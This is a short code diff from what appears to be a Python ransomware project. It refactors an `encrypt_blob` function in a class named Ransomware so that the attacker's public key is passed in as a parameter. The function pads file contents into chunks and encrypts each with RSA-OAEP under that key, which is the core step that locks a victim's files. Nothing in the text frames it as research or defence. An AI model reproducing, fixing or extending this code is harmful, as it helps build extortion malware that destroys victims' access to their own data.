@@ -62,7 +62,7 @@ class Ransomware:
         self.privkey_pem = None
 
 
-def encrypt_blob(fileblob):
+def encrypt_blob(fileblob, attacker_public_key):
     chunk_size = 100
     offset = 0
     end_loop = False
@@ -73,7 +73,7 @@ def encrypt_blob(fileblob):
             end_loop = True
             chunk += b" " * (chunk_size - len(chunk))
         print(chunk)
-        enc_chunk = self.attacker_public_key.encrypt(chunk, crypto_padding.OAEP(
+        enc_chunk = attacker_public_key.encrypt(chunk, crypto_padding.OAEP(
             mgf=crypto_padding.MGF1(
                 algorithm=crypto_hashes.SHA256()),
             algorithm=crypto_hashes.SHA256(),
